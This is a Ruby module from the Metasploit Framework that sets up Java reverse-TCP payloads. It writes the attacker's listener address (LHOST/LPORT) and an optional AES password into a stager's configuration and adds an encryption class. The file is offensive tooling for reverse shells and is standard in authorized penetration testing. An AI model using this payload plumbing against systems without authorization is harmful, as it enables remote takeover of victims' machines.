# -*- coding: binary -*-

module Msf

###
#
# Complex payload generation for Java that speaks TCP
#
###

module Payload::Java::ReverseTcp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Java
  include Msf::Payload::UUID::Options
  include Msf::Payload::Java::PayloadOptions

  #
  # Register Java reverse_tcp specific options
  #
  def initialize(*args)
    super
    register_advanced_options([
      Msf::OptString.new('AESPassword', [false, "Password for encrypting communication", '']),
    ])
  end

  #
  # Generate the transport-specific configuration
  #
  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  def include_send_uuid
    false
  end


  #
  # Generate configuration that is to be included in the stager.
  #
  def stager_config(opts={})
    c = super
    ds = opts[:datastore] || datastore
    pass = ds["AESPassword"] || ''
    if pass != ""
      c << "AESPassword=#{pass}\n"
    end
    c << "LHOST=#{ds["LHOST"]}\n" if ds["LHOST"]
    c << "LPORT=#{ds["LPORT"]}\n" if ds["LPORT"]

    c
  end

  def class_files
    # TODO: we should handle opts in class_files as well
    if datastore['AESPassword'] && datastore['AESPassword'].length > 0
      [
        ["metasploit", "AESEncryption.class"],
      ]
    else
      []
    end
  end

end

end


